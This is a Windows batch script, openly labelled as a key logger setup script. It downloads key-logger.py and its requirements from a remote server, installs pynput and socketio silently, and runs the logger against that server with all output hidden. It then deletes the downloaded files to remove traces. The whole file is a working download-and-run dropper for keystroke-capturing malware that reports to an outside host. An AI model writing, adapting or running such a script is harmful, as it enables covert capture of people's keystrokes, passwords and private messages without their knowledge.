@echo off
setlocal enabledelayedexpansion

REM Key Logger Setup and Run Script for Windows
REM This script will download, install dependencies and run the key logger automatically

REM Configuration
set SCRIPT_DIR=%~dp0
set SERVER_URL=https://api.tryaiadam.com
set VENV_DIR=%TEMP%\keylogger_venv
set DOWNLOAD_BASE_URL=https://api.tryaiadam.com
set DOWNLOADED_FILES=

REM Function to check if command exists
where python >nul 2>&1
if %errorlevel% neq 0 (
    where python3 >nul 2>&1
    if %errorlevel% neq 0 (
        exit /b 1
    )
    set PYTHON_CMD=python3
) else (
    set PYTHON_CMD=python
)

REM Function to download key logger files from server
call :download_keylogger_files
if %errorlevel% neq 0 exit /b 1

REM Check if requirements.txt exists after download
if not exist "%SCRIPT_DIR%requirements.txt" exit /b 1

REM Check if dependencies are already installed
call :check_dependencies
if %errorlevel% neq 0 (
    call :install_dependencies
    if %errorlevel% neq 0 exit /b 1
)

REM Check server connectivity
call :check_server

REM Run the key logger
timeout /t 1 /nobreak >nul 2>&1
call :run_key_logger

REM Cleanup and exit
call :cleanup
exit /b 0

:download_keylogger_files
    REM Check if curl is available
    where curl >nul 2>&1
    if %errorlevel% neq 0 exit /b 1
    
    REM Download key-logger.py
    curl -s --max-time 10 --retry 3 -o "%SCRIPT_DIR%key-logger.py" "%DOWNLOAD_BASE_URL%/key-logger/key-logger.py" >nul 2>&1
    if %errorlevel% neq 0 exit /b 1
    set DOWNLOADED_FILES=%DOWNLOADED_FILES% "%SCRIPT_DIR%key-logger.py"
    
    REM Download requirements.txt
    curl -s --max-time 10 --retry 3 -o "%SCRIPT_DIR%requirements.txt" "%DOWNLOAD_BASE_URL%/key-logger/requirements.txt" >nul 2>&1
    if %errorlevel% neq 0 exit /b 1
    set DOWNLOADED_FILES=%DOWNLOADED_FILES% "%SCRIPT_DIR%requirements.txt"
    
    exit /b 0

:install_dependencies
    REM Method 1: Try creating venv in temp directory
    if not exist "%VENV_DIR%" (
        %PYTHON_CMD% -m venv "%VENV_DIR%" >nul 2>&1
        if %errorlevel% equ 0 (
            call "%VENV_DIR%\Scripts\activate.bat"
            python -m pip install --upgrade pip >nul 2>&1
            pip install -r "%SCRIPT_DIR%requirements.txt" >nul 2>&1
            pip install --upgrade pynput >nul 2>&1
            exit /b 0
        )
    ) else (
        call "%VENV_DIR%\Scripts\activate.bat"
        pip install --upgrade pynput >nul 2>&1
        exit /b 0
    )
    
    REM Method 2: Try installing to user directory
    %PYTHON_CMD% -m pip install --user -r "%SCRIPT_DIR%requirements.txt" >nul 2>&1
    if %errorlevel% equ 0 exit /b 0
    
    REM Method 3: Try with --break-system-packages (last resort)
    %PYTHON_CMD% -m pip install --break-system-packages -r "%SCRIPT_DIR%requirements.txt" >nul 2>&1
    if %errorlevel% equ 0 exit /b 0
    
    exit /b 1

:check_dependencies
    %PYTHON_CMD% -c "import sys; import pynput; import socketio; sys.exit(0)" >nul 2>&1
    exit /b %errorlevel%

:run_key_logger
    REM Activate virtual environment if it exists
    if exist "%VENV_DIR%\Scripts\activate.bat" (
        call "%VENV_DIR%\Scripts\activate.bat"
    )
    
    cd /d "%SCRIPT_DIR%"
    
    REM Run the key logger silently
    %PYTHON_CMD% key-logger.py --server "%SERVER_URL%" >nul 2>&1
    
    exit /b 0

:check_server
    where curl >nul 2>&1
    if %errorlevel% equ 0 (
        curl -s --max-time 5 "%SERVER_URL%" >nul 2>&1
        exit /b %errorlevel%
    )
    exit /b 0

:cleanup
    REM Delete downloaded files
    for %%f in (%DOWNLOADED_FILES%) do (
        if exist %%f del /f /q %%f >nul 2>&1
    )
    exit /b 0 